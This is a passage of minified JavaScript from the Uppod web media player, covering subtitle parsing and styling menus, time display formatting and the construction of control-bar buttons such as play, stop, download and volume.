        poster_mc && "video" == vars.m && Show(poster_mc),
        1 == vars.menuauto && menu_b && (isVisible(menu_big) || Menu()),
        1 == vars.plonend && pl && "inside" == vars.plplace && ("inside" == vars.plplace && (Show(playlist),
        plnext_b && Show(plnext_b.c),
        plprev_b && Show(plprev_b.c)),
        plnext_b && PlArrows())
    }
    function isVisible(t) {
        var e = !1;
        return t && "none" != t.style.visible && (e = !0),
        e
    }
    function FontStyle(t) {
        return "i" != t && "b><i" != t ? "normal" : "italic"
    }
    function FontWeight(t) {
        return "b" != t && "b><i" != t ? "normal" : "bold"
    }
    function ShowBuffer() {
        buffer_b && uppod.controls().Buffer.show()
    }
    function HideBuffer() {
        buffer_b && uppod.controls().Buffer.hide(),
        ibuff = !1
    }
    function updateTimeDisplay() {
        time_play_b && (time_play_b.c.innerHTML = formatTime(CurrentTime())),
        0 < Duration() && (time_back_b && (time_back_b.c.innerHTML = formatTime(Duration() - CurrentTime())),
        time_all_b && (time_all_b.c.innerHTML = formatTime(Duration())))
    }
    function formatTime(t, e) {
        var t = Math.round(t)
          , i = Math.floor(t / 60)
          , o = Math.floor(i / 60)
          , i = Math.floor(i % 60);
        t = Math.floor(t % 60),
        (0 < o || 5 < timelength) && i < 10 && (i = "0" + i);
        t = (0 < o || 5 < timelength ? o + ":" : "") + i + ":" + (t = 10 <= t ? t : "0" + t);
        return t.length == timelength || e || (timelength = t.length,
        PlaceControls()),
        t
    }
    function CreateSubs() {
        0 == vars.sub.indexOf("#") && (vars.sub = un(vars.sub));
        var t = vars.sub.split(",")
          , e = vars.sublangs ? vars.sublangs.split(",") : Array();
        sub = Array();
        for (var i, o = 0; o < t.length; o++)
            "" != t[o] ? (null == e[o] && (i = (i = t[o].substr(t[o].lastIndexOf("/") + 1)).substr(0, i.lastIndexOf(".")),
            e[o] = i),
            CreateSub(o, t[o], e[o]),
            e[o] && vars.sublang && (e[o] == vars.sublang && (sub_lang = o))) : sub_lang == o && sub_lang++;
        vars.sub_tmp = vars.sub,
        delete vars.sub
    }
    function CreateSub(t, e, o) {
        if (e) {
            0 == e.indexOf("#") && (e = un(e));
            var s = vars.sub_shift;
            if (0 < e.indexOf("shift=") && (s = +e.substr(e.indexOf("shift=") + 6)),
            mobile && (nativecontrols || iphone)) {
                var l = document.createElement("track");
                l.setAttribute("src", e),
                l.setAttribute("label", o),
                1 == vars.substart && 0 == t && l.setAttribute("default", "true"),
                media.appendChild(l)
            } else {
                l = LoadFile(e);
                if (l && (-1 < e.indexOf(".srt") || -1 < e.indexOf(".ass") || -1 < e.indexOf(".ssa") || -1 < e.indexOf(".vtt"))) {
                    sub[t] = Object(),
                    sub[t][0] = Array(),
                    sub[t][1] = Array();
                    var r = Array()
                      , r = l.split("\n")
                      , a = 1
                      , n = 0
                      , c = 0;
                    for (i = 0; i < r.length; i++) {
                        if (-1 < e.indexOf(".srt") || -1 < e.indexOf(".vtt"))
                            if (-1 < r[i].indexOf("--\x3e") && -1 < r[i].indexOf(":")) {
                                n = +TimerSub(r[i].substr(0, r[i].indexOf("--\x3e"))) + s,
                                c = +TimerSub(r[i].substr(r[i].indexOf("--\x3e") + 4, 12)) + s,
                                sub[t][0][n] = "";
                                for (var p = n; p < c; p++)
                                    sub[t][1][p] = n;
                                a++
                            } else
                                "" != r[i] && 1 < r[i].length && r[i] != a && (sub[t][0][n] += ("" != sub[t][0][n] ? "<br>" : "") + r[i]);
                        if ((-1 < e.indexOf(".ass") || -1 < e.indexOf(".ssa")) && -1 < r[i].indexOf("Dialogue:")) {
                            n = +TimerSub(r[i].substr(-1 < e.indexOf(".ssa") ? r[i].indexOf("=0") + 3 : 12, 12)) + s,
                            c = +TimerSub(r[i].substr(-1 < e.indexOf(".ssa") ? r[i].indexOf("=0") + 14 : 23, 10)) + s;
                            var d = "";
                            0 < r[i].indexOf("0,,") ? d = r[i].substr(r[i].indexOf("0,,") + 3) : 0 < r[i].indexOf("ffect,") && (d = r[i].substr(r[i].indexOf("ffect,") + 6)),
                            null != sub[t][0][n] ? sub[t][0][n] += "\n" + d : sub[t][0][n] = d,
                            sub[t][0][n] = sub[t][0][n].replace(/{.*?}/, ""),
                            sub[t][0][n] = sub[t][0][n].replace(/\\\\N/, "\n");
                            for (p = n; p < c; p++)
                                sub[t][1][p] = n
                        }
                    }
                }
                vars.substart = 1
            }
        }
    }
    function ShowSub(t) {
        sub_text && KillSub(),
        sub_text = createElement("div"),
        sub_bg = createElement("div"),
        body.c.appendChild(sub_bg),
        body.c.appendChild(sub_text),
        Show(sub_text),
        Show(sub_bg),
        sub_last = t,
        sub_text.innerHTML = t,
        sub_showed = !0,
        PositionSub()
    }
    function StopSub() {
        sub_text && (KillSub(),
        sub_showed = !1)
    }
    function KillSub() {
        sub_text && (sub_text.innerHTML = "",
        body.c.removeChild(sub_bg),
        body.c.removeChild(sub_text),
        sub_text = sub_bg = null)
    }
    function PositionSub() {
        var t, e, i = (ifull ? vars.sh : vars.ph) - (1 != vars.cntrlout || ifull ? vars.cntrloutheight : vars.padding / 2);
        sub_text && (e = vars.sw - 60,
        CSS(sub_text, {
            position: "absolute",
            color: (6 == vars.subcolor.length ? "#" : "") + vars.subcolor,
            fontFamily: vars.subfont,
            fontSize: vars.subsize * (ifull ? 1.5 : 1) + "%",
            "text-align": "center",
            "line-height": "120%",
            "text-shadow": "1px 1px 1px rgba(1,1,1,0.4)"
        }),
        CSS(sub_bg, {
            position: "absolute",
            backgroundColor: (6 == vars.subbgcolor.length ? "#" : "") + vars.subbgcolor,
            opacity: vars.subbgalpha,
            borderRadius: vars.subbgo / 2
        }),
        CSS(sub_text, {
            "max-width": e
        }),
        t = i - vars.submargin * (ifull ? vars.sh / vars.stageheight : 1) - 10 - sub_text.offsetHeight - 5,
        e = (vars.sw - (sub_text.offsetWidth + 20)) / 2,
        CSS(sub_text, {
            position: "absolute",
            top: t,
            left: 10 + e
        }),
        CSS(sub_bg, {
            width: sub_text.offsetWidth + 20,
            height: sub_text.offsetHeight + 10,
            position: "absolute",
            top: t - 5,
            left: e
        })),
        sub_menu && (e = i - sub_menu.offsetHeight,
        (i = sub_b.c.offsetLeft - sub_menu.offsetWidth + sub_b.w + 5) < 0 && (i = 0),
        CSS(sub_menu, {
            position: "absolute",
            top: e,
            left: i
        }),
        CSS(sub_menu_bg, {
            position: "absolute",
            top: e,
            left: i
        }))
    }
    function TimerSub(t) {
        var e = t.split(":")
          , t = 0;
        return 2 == e.length && e.unshift("00"),
        "00" != e[0] && (t += 3600 * e[0]),
        "00" != e[1] && (t += 60 * e[1]),
        t = 10 * (t += +e[2].substr(0, 2)) + +e[2].substr(3, 1)
    }
    function SetSub() {
        if (1 == vars.submenu)
            if (sub_menu)
                ToggleView(sub_menu_bg),
                ToggleView(sub_menu),
                PositionSub();
            else {
                sub_menu = createElement("div"),
                sub_menu_bg = createElement("div"),
                body.c.appendChild(sub_menu_bg),
                body.c.appendChild(sub_menu),
                sub_menu.innerHTML = '<div id="uppodplayer_sub_switcher" style="width:47px;height:18px;border:1px solid rgba(255,255,255,0.5);border-radius:20px;margin-bottom:10px;padding:1px;cursor:pointer"><div id="uppodplayer_sub_switcher_bg" style="width:45px;height:16px;background:#fff;border-radius:18px;padding:1px;"><div id="uppodplayer_sub_switcher_dot" style="width:16px;height:16px;background:#000;border-radius:17px;color:#000;text-align:center;' + (0 == vars.substart ? "float:left" : "float:right") + '"></div></div></div>',
                document.getElementById("uppodplayer_sub_switcher").onclick = ToggleSub;
                var t = createElement("div");
                sub_menu.appendChild(t),
                CSS(t, {
                    fontSize: "80%",
                    position: "absolute",
                    top: 5,
                    right: 7,
                    color: "#fff",
                    opacity: .5,
                    "margin-top": "-2px",
                    cursor: "pointer"
                }),
                t.innerHTML = "×",
                t.onclick = SetSub,
                CSS(sub_menu, {
                    position: "absolute",
                    top: 0,
                    left: 0,
                    color: "#fff",
                    font: "90% sans-serif",
                    borderRadius: 10,
                    padding: 10,
                    width: 119
                }),
                sub_menu2 = createElement("div"),
                ToggleSubStyle(),
                sub_menu.appendChild(sub_menu2);
                var e = createElement("div");
                SetSubButStyle(e, !1),
                e.innerHTML = "+",
                CSS(e, {
                    margin: "0 5px 5px 0"
                });
                t = createElement("div");
                SetSubButStyle(t, !1),
                t.innerHTML = "-",
                CSS(t, {
                    margin: "0 20px 5px 0"
                }),
                e.onclick = function() {
                    vars.subsize += 10,
                    PositionSub()
                }
                ,
                t.onclick = function() {
                    vars.subsize -= 10,
                    PositionSub()
                }
                ;
                e = createElement("div");
                SetSubButStyle(e, !1),
                e.innerHTML = "∧",
                CSS(e, {
                    margin: "0 5px 5px 0"
                });
                t = createElement("div");
                SetSubButStyle(t, !1),
                t.innerHTML = "∨",
                CSS(t, {
                    margin: "0 0 5px 0"
                }),
                e.onclick = function() {
                    vars.submargin += 10,
                    PositionSub()
                }
                ,
                t.onclick = function() {
                    vars.submargin -= 10,
                    PositionSub()
                }
                ;
                e = document.createElement("br");
                sub_menu2.appendChild(e);
                for (var i = Array(), o = Array("FFFFFF", "000000", "FAED54", "FFB0BE", "72CCF8", "62DE50", "E8BBFF", "FEBA54"), s = 2, l = 0; l < 7; l++)
                    i[l] = createElement("div"),
                    SetSubButStyle(i[l], !0),
                    CSS(i[l], {
                        border: "1px solid #" + (1 == l ? "666" : o[l]),
                        opacity: .7,
                        color: "#" + o[l]
                    }),
                    i[l].onclick = function() {
                        vars.subcolor = this.style.color,
                        isub_menu_color.style.opacity = .7,
                        this.style.opacity = 1,
                        isub_menu_color = this,
                        PositionSub()
                    }
                    ,
                    vars.subcolor == o[l] && (s = l);
                i[s].style.opacity = 1,
                isub_menu_color = i[s];
                t = document.createElement("br");
                sub_menu2.appendChild(t);
                for (var r = Array(), a = Array("FFFFFF", "000000", "FEF370", "D90000", "073DA0", "409829", "644082", "a56305"), n = 1, l = 0; l < 7; l++)
                    r[l] = createElement("div"),
                    SetSubButStyle(r[l], !0),
                    CSS(r[l], {
                        "background-color": "#" + a[l],
                        borderColor: "#" + (1 == l ? "666" : a[l]),
                        opacity: .7,
                        color: "#fff"
                    }),
                    0 != l && 2 != l || CSS(r[l], {
                        color: "#000"
                    }),
                    r[l].onclick = function() {
                        vars.subbgcolor = this.style.backgroundColor,
                        isub_menu_bgcolor.style.opacity = .7,
                        this.style.opacity = 1,
                        isub_menu_bgcolor = this,
                        PositionSub()
                    }
                    ,
                    vars.subbgcolor == a[l] && (n = l);
                r[n].style.opacity = 1,
                isub_menu_bgcolor = r[n];
                e = document.createElement("br");
                sub_menu2.appendChild(e);
                t = createElement("div");
                sub_menu2.appendChild(t),
                CSS(t, {
                    float: "left",
                    margin: "0 2px 0 2px",
                    cursor: "default"
                }),
                t.innerHTML = "-";
                e = createElement("div");
                CSS(e, {
                    width: 91,
                    height: 4,
                    border: "1px solid #fff",
                    borderRadius: 4,
                    float: "left",
                    margin: "5px 3px",
                    cursor: "pointer"
                }),
                sub_menu2.appendChild(e);
                t = createElement("div");
                e.appendChild(t),
                CSS(t, {
                    width: 100 * vars.subbgalpha + "%",
                    height: 4,
                    borderRadius: 4,
                    background: "#fff"
                });
                t = createElement("div");
                if (sub_menu2.appendChild(t),
                CSS(t, {
                    float: "left",
                    margin: "0 0 0 2px",
                    fontSize: "80%",
                    cursor: "default"
                }),
                t.innerHTML = "+",
                e.onclick = function(t) {
                    t = t.clientX - findLeft(this);
                    t < 5 && (t = 0),
                    CSS(this.firstElementChild, {
                        width: t
                    }),
                    vars.subbgalpha = t / this.offsetWidth,
                    PositionSub()
                }
                ,
                vars.sublangs) {
                    for (var c, p = document.createElement("select"), d = vars.sublangs.split(","), h = vars.sub_tmp.split(","), u = 0; u < d.length; u++)
                        CSS(c = document.createElement("option"), {
                            backgroundColor: vars.selectbgcolor,
                            color: vars.selectcolor
                        }),
                        c.innerHTML = d[u],
                        p.appendChild(c),
                        d[u] == vars.sublang && (sub_lang = u,
                        c.setAttribute("selected", "true")),
                        "" == h[u] && c.setAttribute("disabled", "true");
                    1 == vars.sublangsall && 1 < d.length && (CSS(c = document.createElement("option"), {
                        backgroundColor: vars.selectbgcolor,
                        color: vars.selectcolor
                    }),
                    c.innerHTML = vars.lang2.all,
                    p.appendChild(c)),
                    sub_menu2.appendChild(p),
                    p.onchange = function() {
                        1 == vars.sublangsall && this.selectedIndex == this.length - 1 ? sub_lang_all = !(sub_lang = 0) : (sub_lang_all = !1,
                        sub_lang = this.selectedIndex)
                    }
                    ,
                    CSS(p, {
                        width: 120,
                        cursor: "pointer"
                    })
                }
                CSS(sub_menu_bg, {
                    position: "absolute",
                    top: 0,
                    left: 0,
                    background: "#000",
                    width: sub_menu.offsetWidth,
                    height: sub_menu.offsetHeight,
                    opacity: "0.7",
                    borderRadius: 10
                }),
                PositionSub(),
                sub_menu.style.zIndex = 7,
                sub_menu_bg.style.zIndex = 7
            }
        else
            ToggleSub()
    }
    function ToggleSub() {
        1 == vars.submenu && CSS(sub_menu.firstElementChild.firstElementChild.firstElementChild, {
            float: 1 == vars.substart ? "left" : "right"
        }),
        !sub && vars.sub && 0 == vars.substart ? (CreateSubs(),
        vars.substart = 1) : 0 == vars.substart ? vars.substart = 1 : vars.substart = 0,
        0 == vars.substart && StopSub(),
        1 == vars.submenu ? ToggleSubStyle() : sub_b && (vars.substart ? CSS(sub_b.c, {
            opacity: sub_b.s.alpha
        }) : CSS(sub_b.c, {
            opacity: sub_b.s.alpha0
        }))
    }
    function ToggleSubStyle() {
        0 == vars.substart ? CSS(sub_menu2, {
            visibility: "hidden"
        }) : CSS(sub_menu2, {
            visibility: "visible"
        }),
        CSS(document.getElementById("uppodplayer_sub_switcher_dot"), {
            background: 0 == vars.substart ? "#fff" : "#000"
        }),
        CSS(document.getElementById("uppodplayer_sub_switcher_bg"), {
            background: 0 == vars.substart ? 0 : "#fff"
        })
    }
    function SetSubButStyle(t, e) {
        sub_menu2.appendChild(t),
        CSS(t, {
            float: "left",
            textAlign: "center",
            width: e ? 11 : 20,
            height: e ? 11 : "auto",
            border: "1px solid rgba(255,255,255,0.5)",
            borderRadius: e ? 11 : 20,
            margin: e ? "3px 2px 7px 2px" : 0,
            padding: e ? "0" : "0 0 0 0",
            cursor: "pointer"
        })
    }
    function Controls() {
        vars.youtube && browser.restrictMediaPlay;
        var t = uppod.controls();
        t.add(new Uppod.ControlBar(uppod)),
        (controls = t.ControlBar.dom).onmouseover = function() {
            vars.controls_active = !0
        }
        ,
        controls.onmouseout = function() {
            vars.controls_active = !1
        }
        ,
        mobile || 1 != vars.hotkey || "video" != vars.m || controls.addEventListener("dblclick", function(t) {
            t.stopPropagation()
        }),
        sep_b = [],
        sep = 0,
        CntrlBg(),
        cntrl = vars.controls.split(","),
        cntrls = [],
        cntrli = [];
        for (var e, i, o, s = cntrlength = 0; s < cntrl.length; s++) {
            if ("play" != cntrl[s] && "playstop" != cntrl[s] || (play_b = new Element("play",20,20),
            t.addElement("Play", play_b),
            controls.appendChild(play_b.c),
            CSS(play_b.c, {
                cursor: "pointer",
                position: "absolute",
                top: (vars.cntrloutheight - play_b.h) / 2 + play_b.s.margintop - play_b.s.marginbottom
            }),
            play_b.c.onclick = Toggle,
            1 == vars.tip && 0 == play_b.s.notip && (play_b.c.onmouseover = function() {
                var t = play_b.s.play_tip || vars.lang2.play;
                ToolTip(play_b.c, t)
            }
            ,
            play_b.c.onmouseout = function() {
                ToolTipHide(play_b.c)
            }
            ),
            pause_b = new Element("playstop" == cntrl[s] ? "stop" : "pause",20,20,"","play"),
            t.addElement("Pause", pause_b),
            controls.appendChild(pause_b.c),
            CSS(pause_b.c, {
                cursor: "pointer",
                display: "none",
                position: "absolute",
                top: (vars.cntrloutheight - pause_b.h) / 2 + pause_b.s.margintop - pause_b.s.marginbottom
            }),
            "playstop" == cntrl[s] ? pause_b.c.onclick = Stop : pause_b.c.onclick = Toggle,
            cntrls[s] = pause_b.w + vars.cntrlmargin,
            cntrlength += cntrls[s] + play_b.s.marginleft + play_b.s.marginright,
            cntrli[s] = play_b,
            1 == vars.tip && 0 == pause_b.s.notip && (pause_b.c.onmouseover = function() {
                ToolTip(pause_b.c, pause_b.s.pause_tip || vars.lang2.pause)
            }
            ,
            pause_b.c.onmouseout = function() {
                ToolTipHide(pause_b.c)
            }
            )),
            "back" == cntrl[s] && (back_b = new Element("back",30,20),
            t.addElement("Back", back_b),
            controls.appendChild(back_b.c),
            CSS(back_b.c, {
                cursor: "pointer",
                position: "absolute",
                top: (vars.cntrloutheight - back_b.h) / 2 + back_b.s.margintop - back_b.s.marginbottom
            }),
            back_b.c.onclick = Back,
            cntrls[s] = back_b.w + vars.cntrlmargin,
            cntrlength += cntrls[s] + back_b.s.marginleft + back_b.s.marginright,
            cntrli[s] = back_b,
            1 == vars.tip && 0 == back_b.s.notip && (back_b.c.onmouseover = function() {
                ToolTip(back_b.c, back_b.s.tip || vars.lang2.back)
            }
            ,
            back_b.c.onmouseout = function() {
                ToolTipHide(back_b.c)
            }
            )),
            "stop" == cntrl[s] && (stop_b = new Element("stop",20,20),
            t.addElement("Stop", stop_b),
            controls.appendChild(stop_b.c),
            CSS(stop_b.c, {
                cursor: "pointer",
                position: "absolute",
                top: (vars.cntrloutheight - stop_b.h) / 2 + stop_b.s.margintop - stop_b.s.marginbottom
            }),
            stop_b.c.onclick = Stop,
            cntrls[s] = stop_b.w + vars.cntrlmargin,
            cntrlength += cntrls[s] + stop_b.s.marginleft + stop_b.s.marginright,
            cntrli[s] = stop_b,
            1 == vars.tip && 0 == stop_b.s.notip && (stop_b.c.onmouseover = function() {
                ToolTip(stop_b.c, stop_b.s.tip || vars.lang2.stop)
            }
            ,
            stop_b.c.onmouseout = function() {
                ToolTipHide(stop_b.c)
            }
            )),
            0 == cntrl[s].indexOf("my") && (e = cntrl[s].substr(2),
            mybuts[e] = new Element("my" + e,20,20),
            controls.appendChild(mybuts[e].c),
            CSS(mybuts[e].c, {
                cursor: "pointer",
                position: "absolute",
                top: (vars.cntrloutheight - mybuts[e].h) / 2 + mybuts[e].s.margintop - mybuts[e].s.marginbottom
            }),
            mybuts[e].c.id = "uppod_mybut" + e,
            mybuts[e].c.onclick = function() {
                Mybut(this.id)
            }
            ,
            cntrls[s] = mybuts[e].w + vars.cntrlmargin,
            cntrlength += cntrls[s] + mybuts[e].s.marginleft + mybuts[e].s.marginright,
            cntrli[s] = mybuts[e],
            1 == vars.tip && 0 == mybuts[e].s.notip && mybuts[e].s.tip && (mybuts[e].c.onmouseover = function() {
                var t = this.id;
                t && (t = t.substr(11),
                ToolTip(mybuts[t].c, mybuts[t].s.tip))
            }
            ,
            mybuts[e].c.onmouseout = function() {
                var t = this.id;
                t && (t.substr(11),
                ToolTipHide(mybuts[e].c))
            }
            )),
            "download" == cntrl[s] && (download_b = new Element("download",20,20),
            t.addElement("Download", download_b),
            controls.appendChild(download_b.c),
            CSS(download_b.c, {
                cursor: "pointer",
                position: "absolute",
                top: (vars.cntrloutheight - download_b.h) / 2 + download_b.s.margintop - download_b.s.marginbottom
            }),
            download_b.c.onclick = Download,
            cntrls[s] = download_b.w + vars.cntrlmargin,
            cntrlength += cntrls[s] + download_b.s.marginleft + download_b.s.marginright,
            cntrli[s] = download_b,
            1 == vars.tip && 0 == download_b.s.notip && (download_b.c.onmouseover = function() {
                ToolTip(download_b.c, download_b.s.tip || vars.lang2.download)
            }
            ,
            download_b.c.onmouseout = function() {
                ToolTipHide(download_b.c)
            }
            )),
            "" != vars.pl && ("next" == cntrl[s] && (next_b = new Element("next",20,20),
            t.addElement("Next", next_b),
            controls.appendChild(next_b.c),
            CSS(next_b.c, {
                cursor: "pointer",
                position: "absolute",
                top: (vars.cntrloutheight - next_b.h) / 2 + next_b.s.margintop - next_b.s.marginbottom
            }),
            next_b.c.onclick = Next,
            cntrls[s] = next_b.w + vars.cntrlmargin,
            cntrlength += cntrls[s] + next_b.s.marginleft + next_b.s.marginright,
            cntrli[s] = next_b,
            1 == vars.tip && 0 == next_b.s.notip && (next_b.c.onmouseover = function() {
                ToolTip(next_b.c, next_b.s.tip || vars.lang2.next)
            }
            ,
            next_b.c.onmouseout = function() {
                ToolTipHide(next_b.c)
            }
            )),
            "prev" == cntrl[s] && (prev_b = new Element("prev",20,20),
            t.addElement("Prev", prev_b),
            controls.appendChild(prev_b.c),
            CSS(prev_b.c, {
                cursor: "pointer",
                position: "absolute",
                top: (vars.cntrloutheight - prev_b.h) / 2 + prev_b.s.margintop - prev_b.s.marginbottom
            }),
            0 == vars.random && CSS(prev_b.c, {
                opacity: .3,
                filter: "alpha(opacity=30)",
                cursor: "default"
            }),
            prev_b.c.onclick = Prev,
            cntrls[s] = prev_b.w + vars.cntrlmargin,
            cntrlength += cntrls[s] + prev_b.s.marginleft + prev_b.s.marginright,
            cntrli[s] = prev_b,
            1 == vars.tip && 0 == prev_b.s.notip && (prev_b.c.onmouseover = function() {
                ToolTip(prev_b.c, prev_b.s.tip || vars.lang2.prev)
            }
            ,
            prev_b.c.onmouseout = function() {
                ToolTipHide(prev_b.c)
            }
            ))),
            "time_play" == cntrl[s] && (time_play_b = new Element("time_play",30,20),
            t.addElement("TimePlay", time_play_b),
            controls.appendChild(time_play_b.c),
            CSS(time_play_b.c, {
                cursor: "default",
                position: "absolute",
                top: (vars.cntrloutheight - time_play_b.h) / 2 + 3 + +time_play_b.s.margintop - +time_play_b.s.marginbottom,
                "white-space": "nowrap"
            }),
            cntrls[s] = time_play_b.w + vars.cntrlmargin,
            cntrlength += cntrls[s] + time_play_b.s.marginleft + time_play_b.s.marginright,
            cntrli[s] = time_play_b,
            timeitems++),
            "time_back" == cntrl[s] && (time_back_b = new Element("time_back",30,20),
            t.addElement("TimeBack", time_back_b),
            controls.appendChild(time_back_b.c),
            CSS(time_back_b.c, {
                cursor: "default",
                position: "absolute",
                top: (vars.cntrloutheight - time_back_b.h) / 2 + 3 + +time_back_b.s.margintop - +time_back_b.s.marginbottom,
                "white-space": "nowrap"
            }),
            cntrls[s] = time_back_b.w + vars.cntrlmargin,
            cntrlength += cntrls[s] + time_back_b.s.marginleft + time_back_b.s.marginright,
            cntrli[s] = time_back_b,
            timeitems++),
            "time_all" == cntrl[s] && (time_all_b = new Element("time_all",30,20),
            t.addElement("TimeAll", time_all_b),
            controls.appendChild(time_all_b.c),
            CSS(time_all_b.c, {
                cursor: "default",
                position: "absolute",
                top: (vars.cntrloutheight - time_all_b.h) / 2 + 3 + +time_all_b.s.margintop - +time_all_b.s.marginbottom,
                "white-space": "nowrap"
            }),
            cntrls[s] = time_all_b.w + vars.cntrlmargin,
            cntrlength += cntrls[s] + time_all_b.s.marginleft + time_all_b.s.marginright,
            cntrli[s] = time_all_b,
            timeitems++),
            "|" == cntrl[s] && (sep_b[sep] = new Element("separator",5,20),
            t.addElement("Separator", sep_b[sep]),
            controls.appendChild(sep_b[sep].c),
            CSS(sep_b[sep].c, {
                cursor: "pointer",
                position: "absolute",
                top: (vars.cntrloutheight - sep_b[sep].h) / 2 + sep_b[sep].s.margintop - sep_b[sep].s.marginbottom
            }),
            cntrls[s] = sep_b[sep].w + vars.cntrlmargin,
            cntrlength += cntrls[s] + sep_b[sep].s.marginleft + sep_b[sep].s.marginright,
            cntrli[s] = sep_b[sep],
            sep++),
            "run_line" == cntrl[s] && (o = Cntrl_Style("run"),
            run_b = createElement("div"),
            t.addDom("RunLine", run_b),
            controls.appendChild(run_b),
            i = vars.cntrlline.h,
            vars.cntrl_line && vars.cntrl_line.h && (i = vars.cntrl_line.h),
            0 == o.position && (i % 2 != o.h % 2 && o.h++,
            1 == o.o && (o.w = o.h)),
            CSS(run_b, {
                cursor: "pointer",
                position: "absolute",
                left: 0,
                top: +o.margintop - +o.marginbottom,
                width: o.w + "px",
                height: o.h + "px",
                borderRadius: o.w * o.o + "px",
                "opacity(": o.alpha,
                filter: "alpha(opacity=" + 100 * o.alpha + ")"
            }),
            CheckGradiendDiv(run_b, o.color),
            o.icon && 0 == String(o.icon).indexOf("http") && (1 == vars.https && (o.icon = o.icon.replace("http://", "https://"),
            o.icon = o.icon.replace("http://", "https://")),
            IconImg(o.icon, run_b, 0, o.pic_w, o.pic_h, o.halficonisover)),
            1 == o.bg && CSS(run_b, {
                border: "2px solid #" + ReColor(o.bgcolor)
            }),
            run_pos = o.position,
            1 == vars.tip && 0 == line_s.notip && (run_b.onmouseover = function() {
                media.duration && ToolTip(run_b, "line")
            }
            ,
            run_b.onmouseout = function() {
                ToolTipHide(run_b)
            }
            )),
            "run_volume" != cntrl[s] || mobile || (o = Cntrl_Style("run_volume"),
            runvolume_b = createElement("div"),
            t.addDom("RunVolume", runvolume_b),
            controls.appendChild(runvolume_b),
            CSS(runvolume_b, {
                "pointer-events": "none",
                cursor: "pointer",
                position: "absolute",
                left: 0,
                top: 0,
                width: o.w + "px",
                height: o.h + "px",
                borderRadius: o.w * o.o + "px",
                opacity: o.alpha,
                filter: "alpha(opacity=" + 100 * o.alpha + ")"
            }),
            CheckGradiendDiv(runvolume_b, o.color),
            runvolume_pos = o.position,
            vars.ivolbar_v && Hide(runvolume_b),
            1 == o.bg && CSS(runvolume_b, {
                border: "2px solid #" + ReColor(o.bgcolor)
            })),
            "sound" == cntrl[s] && !mobile && -1 < vars.controls.indexOf("volbarline") && (cntrl[s] = "volume",
            vars.cntrl_volume = vars.cntrl_sound),
            "volume" != cntrl[s] && "volbarline_v" != cntrl[s] || mobile || (volume_b = new Element("volume",20,20),
            t.addElement("Volume", volume_b),
            controls.appendChild(volume_b.c),
            CSS(volume_b.c, {
                cursor: "pointer",
                position: "absolute",
                top: (vars.cntrloutheight - volume_b.h) / 2 + volume_b.s.margintop - volume_b.s.marginbottom
            }),
            volume_b.c.onclick = Mute,
            volume_mute_b = new Element("volume_mute",20,20,"","volume"),
            t.addElement("VolumeMute", volume_mute_b),
            controls.appendChild(volume_mute_b.c),
            CSS(volume_mute_b.c, {
                display: "none",
                cursor: "pointer",
                position: "absolute",
                top: (vars.cntrloutheight - volume_mute_b.h) / 2 + volume_mute_b.s.margintop - volume_mute_b.s.marginbottom
            }),
            cntrls[s] = volume_mute_b.w + vars.cntrlmargin,
            cntrlength += cntrls[s] + volume_mute_b.s.marginleft + volume_mute_b.s.marginright,
            volume_mute_b.c.onclick = Mute,
            cntrli[s] = volume_b,
            1 == vars.tip && 0 == volume_b.s.notip && (volume_b.c.addEventListener("mouseover", function() {
                var t = vars.lang2.sound;
                ToolTip(volume_b.c, t)
            }),
            volume_b.c.addEventListener("mouseout", function() {
                ToolTipHide(volume_b.c)
            }),
            volume_mute_b.c.addEventListener("mouseover", function() {
                var t = vars.lang2.sound_off;
                ToolTip(volume_mute_b.c, t)
            }),
            volume_mute_b.c.addEventListener("mouseout", function() {
                ToolTipHide(volume_mute_b.c)
            })),
            "volbarline_v" == cntrl[s] && (vars.ivolbar_v = !0,
            volbarline_b = createElement("div"),
            t.addDom("VolumeBarlineV", volbarline_b),
            controls.appendChild(volbarline_b),
            vars.cntrl_volbarline_v.bg = 0,
            CSS(volbarline_b, {
                cursor: "pointer",
                position: "absolute",
                top: 0
            }),
            volbarline_s = Cntrl_Style("volbarline_v"),
            volbarline_all_b = createElement("div"),
            volbarline_b.appendChild(volbarline_all_b),
            CSS(volbarline_all_b, {
                cursor: "pointer",
                position: "absolute",
                left: 0,
                top: 0,
                width: volbarline_s.w,
                height: volbarline_s.h,
                borderRadius: volbarline_s.h / 2 * volbarline_s.o + "px",
                opacity: volbarline_s.all_a,
                filter: "alpha(opacity=" + 100 * volbarline_s.all_a + ")"
            }),
            CheckGradiendDiv(volbarline_all_b, volbarline_s.color_all),
            volbarline_s.active = !1,
            CSS(volbarline_b, {
                display: "none",
                cursor: "pointer",
                position: "absolute",
                top: vars.cntrloutheight - volbarline_s.h - 10
            }),
            volbarline_play_b = createElement("div"),
            volbarline_b.appendChild(volbarline_play_b),
            CSS(volbarline_play_b, {
                "pointer-events": "none",
                position: "absolute",
                left: 0,
                top: 0,
                width: volbarline_s.w,
                height: volbarline_s.h,
                borderRadius: volbarline_s.h / 2 * volbarline_s.o + "px",
                opacity: volbarline_s.play_a,
                filter: "alpha(opacity=" + 100 * volbarline_s.play_a + ")"
            }),
            volbarline_s.color_load && (volbarline_s.color_play = volbarline_s.color_load),
            CheckGradiendDiv(volbarline_play_b, volbarline_s.color_play),
            CSS(volbarline_b, {
                cursor: "pointer",
                position: "absolute",
                top: -volbarline_s.h
            }),
            CSS(volbarline_play_b, {
                height: volbarline_s.h * vars.volume,
                top: volbarline_s.h - volbarline_s.h * vars.volume
            }),
            volbarline_b.onmousedown = function(t) {
                volbarline_s.active = !0,
                VolumeMove_v(t = t || window.event)
            }
            ,
            volbarline_b.onmousemove = function(t) {
                VolumeMove_v(t = t || window.event)
            }
            ,
            volbarline_b.onmouseup = function(t) {
                volbarline_s.active = !1
            }
            ,
            volbarline_b.onmouseover = function(t) {
                volbarline_s.over = !0
            }
            ,
            volbarline_b.onmouseout = function(t) {
                volbarline_s.over = !1
            }
            ,
            volume_mute_b.c.addEventListener("mouseover", VolumeButOver),
            volume_b.c.addEventListener("mouseout", VolumeButOver),
            volume_mute_b.c.addEventListener("mouseout", VolumeButOver),
            volume_b.c.addEventListener("mouseover", VolumeButOver),
            volume_mute_b.c.onmouseout = volume_b.c.onmouseout = VolbarHide,
            volbarline_b.style.zIndex = 7,
            runvolume_b && Hide(runvolume_b))),
            "tune" != cntrl[s] || mobile || (cntrl[s] = "volbarline",
            vars.cntrl_volbarline = vars.cntrl_tune),
            "volbarline" != cntrl[s] || mobile || (volbarline_b = createElement("div"),
            t.addDom("VolumeBarline", volbarline_b),
            controls.appendChild(volbarline_b),
